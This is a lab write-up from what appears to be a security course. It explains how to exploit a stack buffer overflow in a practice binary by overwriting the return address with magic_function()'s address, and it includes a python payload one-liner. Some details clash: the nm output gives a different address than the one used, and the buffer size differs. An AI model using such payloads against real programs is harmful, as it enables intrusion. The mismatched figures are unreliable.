---
nav_order: 1
parent: 'Task: Overwrite Return Address'
---

# Writeup

First use this command to scan the executable:

> ```Bash
> objdump -M intel -d break_this
> ```

- The `main()` function only calls `read_buffer()`.
- This function reads the length of a buffer from standard input into a variable `n`.
- Then it reads the buffer itself (`char buffer[64]`).
- Because `fgets()` reads at most `n - 1` characters, we can set `n` to a value bigger than the length of the buffer, so an overflow may be possible.
- We will set `n` to a large enough value: `120`

- `magic_function()` starts at address `0x401186`
- From the first 3 lines from `read_buffer()` we get that: `rbp` gets pushed on the stack, then the stack is extended by `0x60` = `96`
- So we must print `96 + 8 = 104` dummy characters `A` and then the address of `magic_function()` in little-endian encoding

```console
student@hsi:/.../overwrite-ret-addr/support$ nm break_this | grep magic_function
080491d6 T magic_function
```

However, keep in mind that the stack alignment is 16 bytes for `x64` systems, so the `buffer` variable along with the other four will be aligned to 16 bytes. This is how the variable placement looks like after the stack is aligned:

```c
char buffer[68];                // [rsp+0h] [rbp-60h] BYREF
int n;                          // [rsp+44h] [rbp-1Ch] BYREF
size_t len;                     // [rsp+48h] [rbp-18h]
unsigned int disorienting_var;  // [rsp+54h] [rbp-Ch]
size_t i;                       // [rsp+58h] [rbp-8h]
```

Also make sure to properly pack the address of `magic_function()` in little-endian format (8 bytes). (0x0000000000401186)

``` Bash
python2.7 -c 'print "120\n" + "A" * 104 + "\x86\x11\x40\x00\x00\x00\x00\x00"' > payload
```
